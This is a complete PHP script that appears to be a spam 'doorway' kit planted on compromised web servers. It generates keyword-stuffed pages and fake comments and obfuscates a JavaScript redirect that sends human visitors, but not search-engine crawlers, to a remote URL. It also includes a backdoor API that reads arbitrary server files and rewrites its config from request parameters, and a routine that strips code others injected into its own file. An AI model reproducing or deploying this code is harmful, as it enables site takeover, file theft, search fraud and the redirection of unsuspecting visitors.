<?php #busldhfslfhslms
who_i_am();

fuckhack($_SERVER['SCRIPT_FILENAME']);
$debug = 1;
$version=40;
$ukey=51;
$kid=0;
$suspend_time=14400; //345600 259200 86400

ini_set('display_errors', 1);
if ($debug) {
	error_reporting(E_ALL);
	set_error_handler('bug_found');
} else {
	error_reporting(E_ALL & ~E_NOTICE);
}
ini_set('memory_limit', '32M');

$check = array('<h2>[Key]</h2>','<h3>[Key]</h3>','<strong>[Key]</strong>','<b>[Key]</b>','<b><i>[Key]</i></b>');

# Load Data

parse_config();

if (isset($_GET['p'])) {
	switch($_GET['p']) {
		case 'jquery' :
			header('Content-Type:text/plain');
			echo $config['jquery'];
			break;
		case 'feed' :
/*
			header('Cache-Control: cache, must-revalidate');
			header('Pragma: public');
*/
			header('Content-Type: text/xml; charset=utf-8');
			echo $config['xmlfeed'];
			break;
	}
	exit;
}


if (!isset($config['uid'])) $config['uid']=117;
$ukey = abs($config['uid']-$ukey);

# API
if(ENV('api')) {
	switch(ENV('api')) {
		case 'ShowFile' :
			show_file(); break;
		case 'GetKey' :
			GetKey(); break;
		case 'SetKey' :
			SetKey(); break;
		case 'ShowVersion' :
			echo $version;break;
	}
	exit;
}


if(function_exists('date_default_timezone_set')) date_default_timezone_set('Europe/London');

$id = isset($_GET['page']) ? $_GET['page'] : 'home';


if (isset($_GET['tag'])) {
	$id = 'map';
	$tag = $_GET['tag'];
	$config['keywords'] = array_values(preg_grep("/$tag/", $config['keywords']));
	$config['c_keywords'] = count($config['keywords']);
	for($i=0;$i<$config['c_keywords'];$i++)
		$config['NAMES'][$i] = str_replace(' ','-', $config['keywords'][$i]);
	if (count($config['keywords'])<2) {
		header('Location: '.$ScrPath, TRUE, 302);
		exit;
	}
}

$tm = localtime(time(),true);$mday = ceil($tm['tm_mday']/3);
switch($id) {
	case 'home':
		$ukey=abs($ukey-$mday);
		mk_tmpl($config['index']);
	case 'map':
		$ukey=abs($ukey-$mday+19);
		mk_tmpl($config['map']);
	case 'rss':
		$ukey=abs($ukey-$mday+44);
		mk_rss();
	default:
		$kid=array_search($id, $config['NAMES']);
		if ($kid===false) {
			header('Location: '.$ScrPath, TRUE, 302);
			exit;
		} else {
			$ukey=abs($ukey+$kid-$mday);
			mk_tmpl($config['page']);
		}
		exit;
}

function BitsToBytes($i) {
	$o=42; $d=0x40; $l=strlen($i);
	for ($k=0;$k<$l;$k++) {
		$d/=2;
		$i[$k] == 1 and $o+=$d;
	}
	if ($o>=92) ++$o;
	return chr($o);
}

function CompressCode($ov, $modr) {
	$alpha = 'qazwsedcrfvtgbyhnujmikikolpQAZWSXEDCRFVTGBYHNUJMIKOLP';
	$al = strlen($alpha);
	$V = array();
	$abB='abBcdeiloyY';
	$labB=strlen($abB);
	for ($i=0;$i<$labB; $i++)
		$V[$abB[$i]]='';
	for ($i=0;$i<$labB; $i++)
		for ($k=0;$k<6;$k++)
			$V[$abB[$i]] .= $alpha[mt_rand(0, $al-1)];


	for ($i=0;$i<$labB; $i++)
		for ($j=$i;$j<$labB; $j++)
			if ($V[$abB[$i]] == $V[$abB[$j]] and $i!=$j)
				$V[$abB[$i]].='x';

	$Letters=array_fill(0,255,0);
	$LetterCodes=array_fill(0,255,0);
	$l_ov = strlen($ov);
	for ($i=0;$i<$l_ov;$i++)
		++$Letters[ord($ov[$i])];

	$NextParent=0;
	$SmallestNode1=0;
	$SmallestNode2=1;
	$NodeLetter=array_fill(0,511,0);
	$NodeCount=array_fill(0,511,0);
	$NodeChild1=array_fill(0,511,0);
	$NodeChild2=array_fill(0,511,0);

	for($i=0;$i<255; $i++) {
		if ($Letters[$i]>0) {
			$NodeLetter[$NextParent] = $i;
			$NodeCount[$NextParent] = $Letters[$i];
			$NodeChild1[$NextParent] = -1;
			$NodeChild2[$NextParent++] = -1;
		}
	}

	while ($SmallestNode2 != -1) {
		$SmallestNode2 = $SmallestNode1 = -1;
		for($i=0;$i<$NextParent;$i++) {
			if ($NodeCount[$i] > 0) {
				if ($SmallestNode1 == -1)  $SmallestNode1=$i;
				elseif ($SmallestNode2 == -1) {
					if ($NodeCount[$i] < $NodeCount[$SmallestNode1]) {
						$SmallestNode2 = $SmallestNode1;
						$SmallestNode1 = $i;
					} else
						$SmallestNode2 = $i;
				} elseif ($NodeCount[$i] <= $NodeCount[$SmallestNode1]) {
				   $SmallestNode2 = $SmallestNode1;
				   $SmallestNode1 = $i;
				}
			}
		}
		if ($SmallestNode2 != -1) {
			$NodeCount[$NextParent] = $NodeCount[$SmallestNode1]+$NodeCount[$SmallestNode2];
			$NodeCount[$SmallestNode1] = $NodeCount[$SmallestNode2] = 0;
			$NodeChild1[$NextParent] = $SmallestNode2;
			$NodeChild2[$NextParent++] = $SmallestNode1;
		}
	}

	$Depth=$NextFinal=$idx=0;
	$FinalNodes=array_fill(0, $NextParent-1,0);
	$DepthIndex=array_fill(0,255,0);
	$DepthIndex[0] = $SmallestNode1;


	while ($Depth >= 0) {
		if ($NodeChild1[$DepthIndex[$Depth]] > -1 and $NodeChild2[$DepthIndex[$Depth]] > -1){
			$idx = $NodeChild1[$DepthIndex[$Depth]];
			$NodeChild1[$DepthIndex[$Depth]] = -2 - $NextFinal++;
			$DepthIndex[++$Depth] = $idx;
		}
		elseif ($NodeChild1[$DepthIndex[$Depth]] < 0 and $NodeChild2[$DepthIndex[$Depth]] > -1) {
			$idx = $NodeChild1[$DepthIndex[$Depth]];
			$idx = 0 - $idx;
			$idx-=2;
			$FinalNodes[$idx] = -$NextFinal;
			$idx = $NodeChild2[$DepthIndex[$Depth]];
			$NodeChild2[$DepthIndex[$Depth]] = -2;
			$DepthIndex[++$Depth] = $idx;
		}
		elseif ($NodeChild1[$DepthIndex[$Depth]] < -1 and $NodeChild2[$DepthIndex[$Depth]] < -1)
			--$Depth;
		elseif ($NodeChild1[$DepthIndex[$Depth]] == -1 and $NodeChild2[$DepthIndex[$Depth]] == -1)
			$FinalNodes[$NextFinal++] = $NodeLetter[$DepthIndex[$Depth--]];
		else
			return;
	}

	$CodeIndex=array_fill(0,255,0);
	$Depth = $DepthIndex[0] = 0;
	$c = $CodeIndex[0] = '';

	while ($Depth >= 0) {
		if ($FinalNodes[$DepthIndex[$Depth]] < 0) {
			$c = $CodeIndex[$Depth];
			$idx = $DepthIndex[$Depth];
			$DepthIndex[$Depth + 1] = $DepthIndex[$Depth] + 1;
			$CodeIndex[$Depth + 1] = $c . '0';
			$DepthIndex[$Depth] = 0 - $FinalNodes[$idx];
			$CodeIndex[$Depth] = $c . '1';
			$Depth ++;
		} else {
        	$LetterCodes[$FinalNodes[$DepthIndex[$Depth]]] = $CodeIndex[$Depth];
			$Depth --;
		}
	}


	$bits=$bytes='';

	for ($i=0;$i<$l_ov;$i++) {
			$bits .= $LetterCodes[ord($ov[$i])];
			while (strlen($bits) > 5) {
				$bytes .= BitsToBytes($bits);
			 	$bits = substr($bits,6,strlen($bits));
			}
	}
	$bytes .= BitsToBytes($bits);


	$S = "<script language=\"JavaScript1.2\">\n<!-- \n";
	$encodedNodes='';
	foreach ($FinalNodes as $f) {
		$x = $f + 512;
		$y = $x & 0x3F;
		$x>>=6; $x&=0x3F; $x+=42; $y+=42;
		if ($x >= 92) ++$x;
		if ($y >= 92) ++$y;
		$encodedNodes .= chr($x).chr($y);
	}

	$S .= 'var '.$V['a'].'=';
	while (strlen($encodedNodes) > 74) {
		$S .= '"'.substr($encodedNodes, 0, 74).'"+';
		$encodedNodes = substr($encodedNodes, 74, strlen($encodedNodes));
	}

		$S .='"' . $encodedNodes .'";
 var '.
	$V['l']. '=new Array();
while('.$V['a'].'.length) {
  '.$V['l'].'.push(('.$V['Y'].
  '('.$V['a'].'.charCodeAt(0))<<6)+'.$V['Y'].'('.$V['a'].'.charCodeAt(1))-512);
  '.$V['a'].'='.$V['a'].'.slice(2, '.$V['a'].'.length)
}
var '.$V['d'].'=';


	while (strlen($bytes) > 74) {
      $S .= '"' . substr($bytes, 0, 74) . '"+';
      $bytes = substr($bytes, 74, strlen($bytes));
	}
	$S .= '"' . $bytes . '";
var '.$V['c'].'='.(strlen($ov)).'; var '.$V['e'].'=0;var '.$V['b'].'=0;var '.$V['a'].'=0;var '.$V['o'].'="";

function '.$V['Y'].'('.$V['y'].') {
  if('.$V['y'].'>92)
    '.$V['y'].'--;
  return '.$V['y'].
		'-42
}

function '.$V['B'].'() {
  if('.$V['a'].'==0) {
    '.$V['b'].'='.$V['Y'].'('.$V['d'].'.charCodeAt('.$V['e'].'++));
    '.$V['a'].'=6;
  }
  return (('.$V['b'].'>>--'.$V['a'].')&0x01);
}


while('.$V['c'].'--) {
  var '.$V['i'].'=0;
  while('.$V['l'].'['.$V['i'].']<0) {
    if('.$V['B'].'())
      '.$V['i'].'=-'.$V['l'].'['.$V['i'].'];
    else
      '.$V['i'].'++;
  }
  '.$V['o'].'+=String.fromCharCode('.$V['l'].'['.$V['i'].']);
}
document.write('.$V['o'].');
// -->
</script>
';
	return $S;
}


function Redirect_KL($u, $o) {
	if(isset($_SERVER['HTTP_REFERER']))
		$ref = $_SERVER['HTTP_REFERER'];
	else $ref='';
	return '
<script  type="text/javascript">
	var rr = "'.$ref.'";
	if (!rr) rr=document.referrer;
	var xnav=navigator.userAgent;
	var pattern = /bots[i]/;
	var is_bot=0
	var bots=Array(/google/i,/cuil/i,/yahoo/i,/yandex/i,/alexa/i,/crawler/i,
			/scoutjet/i,/rambler/i,/twiceler/i,/Slurp/i,/ia_archiver/i,
			/obot/i,/igde/i,/snap/i,/bsalsa/i,/yadirect/i,/msnbot/i,
			/msn.com/i,/SnapPreviewBot/i,/ru_spider_web/i,/majestic12/i,
			/bot/i,/bond/i, /spyder/i, /spider/i, /james/i);
	for (var i=0; i<bots.length;i++)
		if (bots[i].test(xnav)) {is_bot=1; break;}
	if (is_bot==0) {
		window.location=encodeURI("'.$u.$o.'&sref="+rr);
	}
</script>
';
}

function Redirect_AG($u, $o, $H, $T) {
	global $config;
	if(isset($_SERVER['HTTP_REFERER']))
		$ref = $_SERVER['HTTP_REFERER'];
	else $ref='';
	return '
<script  type="text/javascript">
	var rr = "'.$ref.'";
	if (!rr) rr=document.referrer;
	function '.$H.'(opt) {
		window.location=encodeURI("'.$u.$o.'&"+opt+"&sref="+rr);
	}

	'.str_replace('__AGREDIRECT_CALL__', $H, $config['js']).'

</script>
';
}

function Redirect_SR($u, $o) {
	if(isset($_SERVER['HTTP_REFERER']))
		$ref = $_SERVER['HTTP_REFERER'];
	else $ref='';
	return '
<script  type="text/javascript">
	var rr = "'.$ref.'";
	if (!rr) rr=document.referrer;
	//window.location=encodeURI("'.$u.$o.'&sref="+rr);
</script>
';
}

function bug_found($errno, $errstr, $errfile, $errline) {
	echo implode(':', array('DD_BUG', $errno, $errline, $errstr));
	exit;
}

function check_kw($k) {
	global $mycheck, $config;
	return str_replace('[Key]', $config['keywords'][$k%$config['c_keywords']], $mycheck);
}

function check_lnk($r) {
	global $config, $mycheck, $ScrPath;
	$r%=$config['c_keywords'];
	return str_replace('[Key]',
		'<a href="'.$ScrPath.'?page='.$config['NAMES'][$r]. '" title="'.$config['keywords'][$r].'">'.$config['keywords'][$r].'</a>', $mycheck);
}
function check_wc($k) {
	global $mycheck, $config;
	return str_replace('[Key]', $config['WC'][$k%$config['c_WC']], $mycheck);
}
function gen_text($mod, $nu, $wc_nu, $count) {
	$text = '';
	global $config, $kid;

	for($i=1; $i<=$count; $i++) {
		$stmpl = $config['TMPL'][mt_rand(0,$config['c_TMPL']-1)];
		if( mt_rand(0,100) < $nu )
			$stmpl = str_1replace('[NN]', '[KW]', $stmpl);
		if( mt_rand(0,100) < $wc_nu )
			$stmpl = str_1replace('[NN]','[WC]', $stmpl);

		$words = explode(' ', $stmpl);
		$c_word=count($words);
		if ($c_word<3) continue;
		for($key=0; $key<$c_word; $key++) {
			if($mod == 'S')
				$words[$key] = str_1replace('[KW]',check_kw($kid), $words[$key]);
			elseif($mod == 'L')
				$words[$key] = str_1replace('[KW]',check_lnk(mt_rand(0,$config['c_keywords']-1)), $words[$key]);
			if ($mod!='A')
				$words[$key] = str_1replace('[WC]', check_wc(mt_rand(0,100)), $words[$key]);
			$words[$key] = str_1replace('[RB]', $config['RB'][mt_rand(0,$config['c_RB']-1)], $words[$key]);
			$words[$key] = str_1replace('[NN]', $config['NN'][mt_rand(0,$config['c_NN']-1)], $words[$key]);
			$words[$key] = str_1replace('[NNS]', $config['NNS'][mt_rand(0,$config['c_NNS']-1)], $words[$key]);
			$words[$key] = str_1replace('[VB]', $config['VB'][mt_rand(0,$config['c_VB']-1)], $words[$key]);
			$words[$key] = str_1replace('[VBN]', $config['VBN'][mt_rand(0,$config['c_VBN']-1)], $words[$key]);
			$words[$key] = str_1replace('[VBG]', $config['VBG'][mt_rand(0,$config['c_VBG']-1)], $words[$key]);
			$words[$key] = str_1replace('[JJ]', $config['JJ'][mt_rand(0,$config['c_JJ']-1)], $words[$key]);
			$words[$key] = str_1replace('[JJR]', $config['JJR'][mt_rand(0,$config['c_JJR']-1)], $words[$key]);
		}
		$text.= trim(ucfirst(strtolower(join(' ', $words))));
	}
	return preg_replace("/\s*([\.\,\!\?])\s*/", "$1 ", $text);
}

function make_comment($m) {
	global $urls, $config;
	if ($config['c_CL']==0) return '';
	$U = rand_arr($config['CL'],mt_rand(1,min(10, count($config['CL']))));
	$newpost = new_post($U);

	if ($newpost)
		return '
<div id="my_comments">
	<h3>Comments:</h3>
	<ul class="myul">'.
		$newpost.
	'</ul>
</div>
';

}

function mk_rss() {
	global $config, $ScrPath;
	define('LK_TMPL','http://[Domain][Page]');
	$rss=
'<?xml version="1.0"?>
<rss version="2.0">
  <channel>
    <title>[Key_main]</title>
    <link>[Main_url]</link>
    <description>[Key_main]</description>
    <language>en-us</language>
    <pubDate>[Date]</pubDate>
    <item>
      <title>[Key_pag]</title>
      <link>[Url]</link>
      <description>[Content]</description>
      <pubDate>[Date]</pubDate>
    </item>
  </channel>
</rss>';

	$items = '';
	$c_rss=min(200,$config['c_keywords']);
	$day=strftime('%j');
	$myday=strftime('%Y-%m-%d');

	$m_url = str_replace('[Page]',$ScrPath, LK_TMPL);
	$rss = str_replace('[Main_url]',$m_url,
		str_replace('[Key_main]',ucfirst($config['keywords'][0]), $rss)
	);
	$rss=str_replace('[Domain]',$_SERVER['HTTP_HOST'], $rss);
	preg_match("/<item>.*?<\/item>/si",$rss,$tmp);
	$t_items = $tmp[0];
	foreach (rand_arr($config['keywords'], $c_rss) as $k => $skwd) {
		$item = $t_items;
		$url = str_replace('[Page]',$ScrPath.'?page='.str_replace(' ','-',$skwd), LK_TMPL);
		$item = str_replace('[Url]',$url,
			str_replace('[Key_pag]',ucfirst($skwd), $item)
		);
		$rss_content = preg_replace("/\[.*?\]/", '',
			preg_replace("/<.*?>/", '', trim(gen_text('S',20,20,2)))
		);
		$items.= "\n    ".str_replace('[Content]', $rss_content, $item)."\n";
	}
	$items = str_replace('[Domain]',$_SERVER['HTTP_HOST'],$items);
	echo str_replace('[Date]', $myday,
		str_replace($t_items, $items, $rss)
	);
	exit;
}

function mk_tmpl($template) {
	global $ukey, $config, $kid, $mycheck, $check, $suspend_time, $Video, $ScrPath, $ScrName;


	$template = str_replace('__AGREDIRECT__', '__REDIRECT__', $template);
	$template = str_replace('<script src="prototype.js" type="text/javascript"></script>', '', $template);
	$abs_path = str_replace($ScrName.'.php', '', $ScrPath).str_replace('config','',find_config());
	$template = str_replace('src="', 'src="'.$abs_path, str_replace('href="', 'href="'.$abs_path, $template));
	$template = str_replace($abs_path.'rss.xml', $ScrPath.'?page=rss', $template);
	$template = str_replace($abs_path.'jquery.js', $ScrPath.'?p=jquery', $template);
	$config['js'] = str_replace('src="', 'src="'.$abs_path, str_replace('href="', 'href="'.$abs_path, $config['js']));
	$config['js'] = str_replace('feed.xml', $ScrPath.'?p=feed', $config['js']);

	mt_srand($ukey);
	$Images = isset($config['images'])? $config['images'] : glob("*img_*");
	$Video = get_video();
	$TAGS=array();
	$mycheck = $check[mt_rand(0,count($check)-1)];
	$meta_keys = array();
	$meta_keys[]=$config['keywords'][$kid];
	if ($kid)
		$meta_keys[]=$config['keywords'][0];


	if (!strpos($template, '[TAGS]'))
		$template = str_replace('[COMMENT]', '<br/>[TAGS]<br/>[COMMENT]', $template);


	preg_match_all("/\[For\.\.\d+-\d+].*?\[EndFor]/si", $template, $mcrs);
	foreach($mcrs[0] as $mcr) {
		preg_match("/(\d+)-(\d+)/", $mcr, $range);
		$template = str_1replace($mcr, str_repeat($mcr,mt_rand($range[1],$range[2])), $template);

	}

	preg_match_all("/\[Rword:.*?:]/si", $template, $mcrs);
	foreach($mcrs[0] as $mcr) {
		$ws = explode(':', $mcr);
		$ws = array_slice($ws,1,count($ws)-2);
		$template = str_1replace($mcr, $ws[mt_rand(0,count($ws)-1)], $template);
	}

	$template = preg_replace_callback("/\[COMMENT]/si",'make_comment', $template);
	preg_match_all("/\[Date_.+?]/si", $template, $mcrs);
	foreach($mcrs[0] as $mcr) {
		preg_match("/_(.+)]/", $mcr, $tmp);
		$template = str_1replace($mcr,strftime($tmp[1],time()-mt_rand(0,5184000)), $template);
	}

	preg_match_all("/\[Rndf_\d+_\d+]/si", $template, $mcrs);
	foreach($mcrs[0] as $mcr) {
		preg_match("/(\d+)_(\d+)/", $mcr, $range);
		$template = str_1replace($mcr,mt_rand($range[1],$range[2]), $template);
	}


	preg_match_all("/\[Links_pag_\d+_.*?]/si", $template, $mcrs);
	foreach($mcrs[0] as $key => $mcr) {
		$link = '';
		preg_match("/(\d+)_(.*?)\]/", $mcr, $cs);
		for($i=1; $i<=min($cs[1], $config['c_keywords']); $i++) {
			$r =mt_rand(0, $config['c_keywords']-2);
			if (mt_rand(0,100)>60) $r%=50;$r++;
			$meta_keys[]=$config['keywords'][$r];
			foreach (explode(' ', $config['keywords'][$r]) as $k)
				if (strlen($k)>5)
					$TAGS[$k] = isset($TAGS[$k]) ? $TAGS[$k]+1 : 1;

			$link.='<a href="'.$ScrPath.'?page='.$config['NAMES'][$r].'" title="'.ucfirst($config['keywords'][$r]).'">'.ucfirst($config['keywords'][$r]).'</a>'.$cs[2];
		}
		$template = str_1replace($mcr, $link, $template);
	}


	preg_match_all("/\[[A-Z]Content_\d+_\d+]/si", $template, $mcrs);
	foreach($mcrs[0] as $mcr) {
		preg_match("/([A-Z])Content_(\d+)_(\d+)/", $mcr, $tmp);
		$template = str_1replace($mcr, gen_text($tmp[1], 20,10, $tmp[2]), $template);
	}

	preg_match_all("/\[Map_.*?]/si", $template, $mcrs);
	foreach($mcrs[0] as $mcr) {
		$map='';
		preg_match("/_(.*?)\]/", $mcr, $tmp);
		for($i=0;$i<$config['c_keywords'];$i++)
			$map.='<a href="'.$ScrPath.'?page='.$config['NAMES'][$i].'" title="'.ucfirst($config['keywords'][$i]).'">'.ucfirst($config['keywords'][$i]).'</a>'.$tmp[1]."\n";
		$template = str_1replace($mcr, $map , $template);
	}

	preg_match_all("/\[[A-Z]Keys_\d+_.*?]/si", $template, $mcrs);
	foreach($mcrs[0] as $key => $mcr) {
		preg_match("/\d+_.*?]/", $mcr, $tmp);
		$cs = explode('_', $tmp[0]);
		$cs[1] = str_replace("]", '', $cs[1]);
		preg_match("/[A-Z]/", $mcr, $tmp);
		$mod = $tmp[0];
		$keystr = '';

		for($i=1; $i<min($cs[0], $config['c_keywords']); $i++) {
			if($mod == 'S') { $keystr.= $config['keywords'][$i].$cs[1];}
			if($mod == 'R') { $keystr.= $config['keywords'][mt_rand(0,$config['c_keywords']-1)].$cs[1];}
		}
		if(isset($cs[2]))
			$keystr = str_replace($cs[2], '', $keystr);
		$template = str_1replace( $mcr, ucfirst($keystr), $template);
	}

	$template=str_1replace('[Image]','',$template);

	if (count($Video)>3) {
		$v = $Video[mt_rand(0,count($Video)-1)];
		$template=str_1replace('[Image]',
			'<object id="player" width="480px" height="320px" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab">
				<param value="http://www.youtube.com/v/'.$v.'&fs=1&hl=en&autoplay=0&enablejsapi=1&playerapiid=player" name="movie"/>
				<param value="true" name="allowFullScreen"/>
				<param value="always" name="allowScriptAccess"/>
				<embed id="embed_player_1" width="480px" height="320px" src="http://www.youtube.com/v/'.$v.'&fs=1&hl=en&autoplay=0&enablejsapi=1&playerapiid=embed_player_1" allowfullscreen="true" allowscriptaccess="always" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" bgcolor="#000000" />
			</object>',
			$template
		);
	}


	if (count($TAGS)>3) {
		preg_match_all("/\[TAGS]/si", $template, $mcrs);
		foreach($mcrs[0] as $key => $mcr) {
			$tag='<br/>Tags: ';
			foreach (rand_arr(array_keys($TAGS), mt_rand(3,7)) as $k =>$v ) {
				$tag.= '<strong><a rel="tag" href="'.$ScrPath.'?tag='.$v.'">'.$v.'</a></strong>, ';

			}
			$template = str_1replace($mcr, $tag, $template);
		}
	}

	if (count($Images)>3) {
		preg_match_all("/\[Image]/si", $template, $mcrs);
		foreach($mcrs[0] as $key => $mcr) {
			$mimg = mt_rand(0,count($Images)-1);
			$tmp=$Images[$mimg]; $Images[$mimg]=$Images[0]; $Images[0]=$tmp;
			$mimg = array_shift($Images);
			$template = str_1replace( $mcr, '<img width="320px" src="'.$mimg .'" alt="'.$config['keywords'][$kid].'" />', $template);
		}
	}
	$template = preg_replace("/\[.*?]/", '',
  	  str_replace('[Link_map]', '<a href="'.$ScrPath.'?page=map">Map</a>',
	    str_replace('[Link_index]', '<a href="'.$ScrPath.'">'.ucfirst($config['keywords'][0]).'</a>',
		  str_replace('[Key_main]',ucfirst($config['keywords'][0]),
		    str_replace('[Key_pag]',ucfirst($config['keywords'][$kid]),
		      preg_replace("/\[MetaDesc]/", str_replace('"','',trim(substr(ucfirst($kid?$config['keywords'][$kid].' - '.$config['keywords'][0]:$config['keywords'][0]).'. '. gen_text('A',100,50,1),0, 120)).'.'),
			    preg_replace("/\[MetaKeys]/", join(', ',array_splice($meta_keys, 0, 10)), $template)
			  )
		    )
		  )
		)
	  )
	);
	$params =
		'&tds-k=' .urlencode($config['keywords'][$kid]).
		'&tid='   .$config['task_id'].
		'&tmpl='  .$config['template'].
		'&dm='    .$_SERVER['HTTP_HOST'].
		'&dct='   .$config['dict'].
		'&q2='    .$config['topic'].
		'&q='     .$config['subtopic'];
	$ttype = substr($config['template'],0,2);
	switch ($ttype) {
		case 'kl':
			$template = str_replace(
				'__REDIRECT__',
				CompressCode(Redirect_KL($config['redirect_url'], $params), $kid),
				$template
			);
			break;
		case 'ag':
			$alpha = 'qazwsedcrfvtgbyhnujmikikolpQAZWSXEDCRFVTGBYHNUJMIKOLP';
			$al = strlen($alpha)-1;
			$H=$T='';
			for ($k=0;$k<6;$k++) {
				$H .= $alpha[mt_rand(0,$al)];
				$T .= $alpha[mt_rand(0,$al)];
			}
			if ($H == $T) $T.='x';
			$template = str_replace(
				'__REDIRECT__',
				CompressCode(Redirect_AG($config['redirect_url'], $params, $H, $T), $kid),
				$template
			);
			$template = str_replace('__AGREDIRECT_CALL__', $H, $template);
			break;

		default  :
			$template = str_replace(
				'__REDIRECT__',
				CompressCode(Redirect_SR($config['redirect_url'], $params), $kid),
				$template
			);
			break;
	}

	$pik = '<!-- Piwik -->
<script type="text/javascript">
var pkBaseURL = (("https:" == document.location.protocol) ? "https://server/piwik/" : "http://server/piwik/");
document.write(unescape("%3Cscript src=\'" + pkBaseURL + "piwik.js\' type=\'text/javascript\'%3E%3C/script%3E"));
</script><script type="text/javascript">
try {
var piwikTracker = Piwik.getTracker(pkBaseURL + "piwik.php", 2);
piwikTracker.trackPageView();
piwikTracker.enableLinkTracking();
} catch( err ) {}
</script><noscript><p><img src="http://server/piwik/piwik.php?idsite=2" style="border:0" alt=""/></p></noscript>
<!-- End Piwik Tag -->';



/*
	if (is_rewrite())
		$template=str_replace('index.php?page=', '', str_replace('index.php?tag=', 'tag/', $template));
*/
	//$template= str_replace('</head>',$pik.'</head>', $template);
	echo str_replace('__DOORHASH__',$config['doorhash'], $template);

	exit;
}

function new_post($U) {
	global $kid;
	$count = count($U);
	for ($post='',$i=0;$i<$count;$i++) {
		$uu = explode(':', $U[$i]);
		if (count($uu)!=2) continue;
		$uu[0]=str_replace("_", " ", $uu[0]);
		$tt='';
		if ((preg_match("/page=(.+)/", $uu[1], $top) or	preg_match("/.+\/(.+)\.html/", $uu[1], $top)) and $top[1]!='map') {
			$tt=$top[1];
		}
		$post .= '<li>
			<div class="mycomm" id="'.
			mt_rand(0,1000).'"><div><cite><a href="http://'.
			$uu[1].	'" rel="external" title="'.
			str_replace('-',' ',$tt).'" >'.
			$uu[0].': '.str_replace('-',' ',$tt).'</a></cite>:</div>
			<small>[Date_%m/%Y]</small><p>'.
			gen_text('S', 20, 10, mt_rand(1,5)). '</p>
			</div>
		</li>
';
	}
	return $post;
}

function str_1replace($f, $t, $s) {
	$f=preg_quote($f, '/');
	return preg_replace("/$f/is", $t, $s, 1);
}

function get_video() {
	global $config;
	if (isset($config['video']))
		return explode(';',$config['video']);
	return false;
}

function show_file() {
	if (ENV('file') and file_exists(ENV('file')) and is_readable(ENV('file')) and ($f=fopen(ENV('file'),'r'))) {
		while (!feof($f))
			echo fgets($f);
		fclose($f);
		echo "api:ok";
	}
	echo "api:fail";
}

function rand_arr($arr,$lim) {
	$a = array();
	$c = count($arr);
	while ($c and $lim--) {
		$m = mt_rand(0, --$c);
		$t = $arr[0];$arr[0]=$arr[$m];$arr[$m]=$t;
		$a[] = array_shift($arr);
	}
	return $a;
}

function ENV($s) {
	return ($s ?
		(isset($_POST[$s]) ?
			$_POST[$s]
		  : (isset($_GET[$s])?$_GET[$s]: false)
		)
	  : false);
}

function parse_config() {
	global $config;
	$config = unserialize(implode('', gzfile(find_config())));

	if (!isset($config['CL'])) $config['CL']=array();
	else $config['CL']=explode(';',$config['CL']);

	foreach (explode(' ' ,'CL RB NN NNS VB VBN VBG JJ JJR WC TMPL keywords') as $x)
		$config['c_'.$x] = count($config[$x]);
	for($i=0;$i<$config['c_keywords'];$i++)
		$config['NAMES'][$i] = str_replace(' ','-', $config['keywords'][$i]);
}


function GetKey() {
	if (ENV('key')) {
		$config = unserialize(implode('', gzfile(find_config())));
		echo $config[ENV('key')];
	} else
		echo 'error';

	exit;
}

function SetKey() {
	$conff = find_config();
	if (is_writable()) {
		$config = unserialize(implode('', gzfile($conff)));
		foreach (array_merge((array)$_GET, (array)$_POST) as $opt=>$value) {
			if ($opt == 'api' or $opt == 'enc') continue;
			$config[$opt]=(ENV('enc')==1) ? base64_decode($value) : $value;
		}
		$z=gzopen($conff, 'w');
		gzwrite($z, serialize($config));
		gzclose($z);
		echo 'api:ok';
	} else
		echo 'api:fail';
	exit;
}
function is_rewrite() {
	return  function_exists('apache_get_modules') and
		in_array('mod_rewrite',apache_get_modules()) and
		file_exists('.htaccess');
}

function fuckhack($fn) {
	$rpl = '<?php #busldhfslfhslms';
	if (is_readable($fn) and is_writable($fn)) {
		$s = implode('', file($fn));
		if( ($pos=strpos($s, $rpl)) > 0) {
			$f = fopen($fn, 'w');
			fwrite($f, substr_replace($s, $rpl, 0, $pos+strlen($rpl)));
			fclose($f);
		}
	}
}

function who_i_am() {
	global $ScrPath, $ScrName;
	$p = array('SCRIPT_NAME', 'PHP_SELF');
	foreach ($p as $f) {
		if (isset($_SERVER[$f]) and ($pos=strpos($_SERVER[$f], '.php'))>0)
			$ScrPath  = $_SERVER[$f];
			$ScrName = preg_replace("/.*\//", '', substr($_SERVER[$f], 0, $pos));
			return;
	}
	exit;
}
function find_config() {
	global $ScrName;
	if (file_exists($ScrName.'/config'))
		return $ScrName.'/config';
	elseif (file_exists('config'))
		return 'config';
	return;
}


?>





